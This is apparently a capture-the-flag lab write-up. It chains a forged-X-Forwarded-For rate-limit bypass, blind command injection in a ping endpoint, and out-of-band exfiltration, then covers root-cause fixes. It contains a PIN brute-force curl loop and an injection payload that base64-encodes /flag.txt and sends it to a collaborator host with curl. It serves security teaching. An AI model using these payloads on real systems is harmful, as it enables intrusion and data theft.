# PingBoard — Rate-Limit Bypass → Blind Command Injection → OOB Exfil

| | |
|---|---|
| **Vulnerabilities** | Forgeable-header rate-limit bypass · blind OS command injection · out-of-band exfiltration |
| **Impact** | Remote code execution with no credentials |
| **Difficulty** | ★★★★★ |
| **Approach** | Black-box, no credentials, no source |

## The application

PingBoard is an uptime-monitoring SaaS. You start with **nothing** — no account, no endpoint map, no
source. The flag lives at `/flag.txt`, readable only through RCE, and the vulnerable endpoint returns
**no output**. Three obstacles stand between a visitor and the flag, each a different class, each
unlocking the next.

```bash
docker compose up -d        # http://localhost:9003
```

## Obstacle 1 — Rate-limit bypass via a forgeable header

The admin login takes a 4-digit PIN (10,000 possibilities), but a rate limiter blocks brute-forcing
after 5 attempts. The flaw is *how* it identifies a client:

```python
def client_key():
    return request.headers.get("X-Forwarded-For", request.remote_addr)   # trusts a client header
```

`X-Forwarded-For` is just a request header — a proxy is *supposed* to set it, but any client can.
Rotating it per request makes every attempt look like a new client, so the limiter never trips:

```bash
for pin in $(seq -w 0 9999); do
  curl -s -X POST http://localhost:9003/api/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))" \
    -d "{\"username\":\"admin\",\"pin\":\"$pin\"}" | grep -q token && echo "PIN: $pin"
done
# PIN: 4921  ->  JWT returned
```

## Obstacle 2 — Blind OS command injection

Authenticated, the monitor endpoint "pings" a host you supply by dropping it into a shell command:

```python
subprocess.run("ping -c 1 -W 1 " + host, shell=True, ...)   # host concatenated into a shell string
```

`host = "x; <command>"` runs the second command. But the endpoint only returns a boolean
(reachable / unreachable) — the output never comes back. It is **blind**.

## Obstacle 3 — Out-of-band exfiltration

Blind is not a dead end — it tells you to bring your own channel. Stand up a listener (here a public
collaborator) and have the target carry the flag out on a request. Base64 protects characters that
would break the URL:

```
host = x; curl https://<collaborator>/$(cat /flag.txt | base64)
```

Decode the callback path:
```bash
echo '<base64-from-path>' | base64 -d
# FLAG{bl1nd_cmd1_00b_3xf1l_r4t3l1m1t_byp4ss}
```

## Root-cause fixes

**Rate limit** — never key a security decision on a client-controlled header. Use the real socket
peer (`request.remote_addr`); behind a trusted proxy, use `ProxyFix(x_for=N)` with the real hop
count and trust only the IP your own infrastructure appended. Add per-account lockout + backoff, and
don't gate admin behind a 4-digit PIN (use a real credential + MFA).

**Command injection** — remove the shell and pass the host as its own argument, so input can never be
parsed as a command:

```python
subprocess.run(["ping", "-c", "1", "-W", "1", host], shell=False, ...)
```

Note this is *not* "filter the dangerous characters" — filtering is a blacklist you will lose. The
fix removes the shell entirely. (A `shell=False` call that still passes a concatenated **string**
only looks safe: it blocks injection by accident while breaking the feature for every host — and a
fix that breaks the feature gets reverted.)

**Exfil** — defense in depth: restrict outbound network egress so a compromised host cannot reach an
attacker's collaborator.

## Key lesson

Two of these three bugs come down to the same rule: **never trust client-controllable input for a
security decision** (the `X-Forwarded-For` header) and **keep untrusted input as data, not code**
(the command injection). "No output" from an injection point is not failure — it is a hint about how
to exfiltrate.
